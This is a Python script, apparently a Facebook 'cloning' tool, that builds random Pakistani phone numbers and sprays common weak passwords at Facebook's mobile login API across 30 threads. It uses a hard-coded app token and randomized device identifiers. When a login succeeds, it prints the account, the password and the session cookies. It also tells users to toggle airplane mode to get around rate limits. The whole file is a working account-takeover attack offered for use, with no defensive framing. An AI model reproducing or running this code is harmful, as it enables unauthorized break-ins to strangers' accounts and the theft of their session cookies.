import os,time,random,string,sys,uuid,json
from concurrent.futures import ThreadPoolExecutor
import requests

from datetime import date
from datetime import datetime
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
jm = current.year
jm = current.month
jd = current.day
today = date.today()

numbs = []
loop=0
ok_ids=[]
cp_ids=[]

BLACK = '\x1b[1;90m'
BLAC= '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
SOR = '\033[34m'
PINK= '\033[35m'
BLUE= '\033[36m'
WHITE = '\033[37m' 
RESET = '\033[39m'
ORANGE = '\033[1;35m'
 

logo = f''' 


  {BLACK}$$$$$$\   $$$$$$\     {RED}$$$$$\  {GREEN}$$$$$$\  $$$$$$$\  
 {BLACK}$$  __$$\ $$  __$$\    {RED}\__$$ |{GREEN}$$  __$$\ $$  __$$\ 
 {BLACK}$$ /  \__|$$ /  $$ |      {RED}$$ |{GREEN}$$ /  $$ |$$ |  $$ |
 {BLACK}\$$$$$$\  $$$$$$$$ |      {RED}$$ |{GREEN}$$$$$$$$ |$$ |  $$ |
  {BLACK}\____$$\ $$  __$$ |{RED}$$\   $$ |{GREEN}$$  __$$ |$$ |  $$ |
 {BLACK}$$\   $$ |$$ |  $$ |{RED}$$ |  $$ |{GREEN}$$ |  $$ |$$ |  $$ |
 {BLACK}\$$$$$$  |$$ |  $$ |{RED}\$$$$$$  |{GREEN}$$ |  $$ |$$$$$$$  |
  {BLACK}\______/ \__|  \__| {RED}\______/ {GREEN}\__|  \__|\_______/{BLACK}A{RED}F{GREEN}G'''

def clear():
	os.system('clear')
	print(logo)
	line()
	print(f'| [{RED}+{GREEN}]AUTHOR        : SAJAD JAN')
	print(f'| [{RED}+{GREEN}]FACEBOOK      : Žãłïm Bãčhã')
	print(f'| [{RED}+{GREEN}]GITHUB        : Sajadjan')
	print(f'| [{RED}+{GREEN}]TELEGRAM      : https://t.me/Sajad08')
	print(f'| [{RED}+{GREEN}]STATUS        : FREE & TEST')
	print(f'| [{RED}+{GREEN}]VERSION       : 0.0')

def line():
	print(f'{GREEN}|----------------------------------------------------')

def main():
	clear()
	line()	
	print(f'| [{RED}1{GREEN}] RANDOM CLONING')
	print(f'| [{RED}2{GREEN}] CONTACT ADMIN')
	print(f'| [{RED}0{GREEN}] EXIT')
	line()
	inp = str (input('| CHOOSE : ')).strip()
	if inp in ['1','01']:
		randomClone()
	elif inp in ['2','02']:
		os.system('xdg-open https://t.me/+93744459427')
		main()
	elif inp in ['0','00']:
		print('| EXIT DONE')
		exit()
	else:
		print('| OPTION NOT FOUND IN MENU')
		time.sleep(1)
		main()
	
	
def randomClone():
	clear()
	line()
	print(f'| [{RED}1{GREEN}] AFGHANISTAN CLONING')
	print(f'| [{RED}0{GREEN}] BACK TO MAIN MENU')
	line()
	inp = str (input('| CHOOSE : ')).strip()
	if inp in ['1','01']:
		afgClone()
	elif inp in ['0','00']:
		time.sleep(1)
		main()
	else:
		print('| OPTION NOT FOUND')
		time.sleep(1)
		randomClone()
def afgClone():
	clear()		
	line()
	print('| PAK CODES : (0300,0301,0302,0303,0304,0305)')
	print('| PAK CODES : (92300,92301,92302,92303,92305)')
	line()
	inp = str(input('| CHOOSE CODE : '))
	try:
	    limit = int(input('| PUT LIMIT: '))
	except:
		limit = 5000
	for _ in range(limit):
		numb = ''.join(random.choice(string.digits) for _ in range(7))
		numbs.append(numb)
	with ThreadPoolExecutor(max_workers = 30) as sajad:
		clear()
		line()
		ran = str(len(numbs))
		print(f'| [{RED}✓{GREEN}]METHOD        : RANDOM CLONING')
		print(f'| [{RED}✓{GREEN}]CHOOSE CODE   : {inp}')
		print(f'| [{RED}✓{GREEN}]LIMIT         : {ran}')
		print(f'| [{RED}✓{GREEN}]TODAY DATE    : {today}')
		print(f'| [{RED}✓{GREEN}]START TIME    : {dt_string}')
		print(f'| [{RED}✓{GREEN}]ON/OFF AIRPLANE MODE BEFORE USE')
		line()
		for number in numbs:
			ids = inp + number
			passwords = [number,ids,'pakistan','pakistan123','khan12345','khankhan','khan1234','khan1122','pakistan1234','pubg1234','malik12345']
			sajad.submit(startClone,ids,passwords)


def startClone(ids,passwords):
	ran = str(len(numbs))
	try:
		global loop
		sys.stdout.write(f'\r{GREEN}| [SAJAD]:-%s/{ran} OK:-%s/ {RED}CP:-%s{WHITE}'%(loop,len(ok_ids),len(cp_ids)))
		for pas in passwords:
			useragent='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'			
			data={
                                'adid': str(uuid.uuid4()),
                                'format': 'json',
                                'device_id': str(uuid.uuid4()),
                                'email': ids,
                                'password': pas,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': 'en_GB',
                                'client_country_code': 'GB',
                                'fb_api_req_friendly_name': 'authenticate'}
			header ={
                                'User-Agent': useragent,
                                'Accept-Encoding':  'gzip, deflate',
                                'Accept': '*/*',
                                'Connection': 'keep-alive',
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Friendly-Name': 'authenticate',
                                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			data1 = requests.post(url,data=data,headers=header).text 
			data2 = json.loads(data1)
			if 'session_key' in data2:
				print(f'\r{GREEN}| [SAJAD-OK] {ids} | {pas}')
				cookie = ";".join(_['name']+'='+_['value'] for _ in data2['session_cookies'])
				print(f'\r| [COOKIE-⚡] : {SOR} {cookie}')
				ok_ids.append(ids)
				break
			else:pass
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
		pass
	except Exception as error:
		print(error)
		
		
	
main()

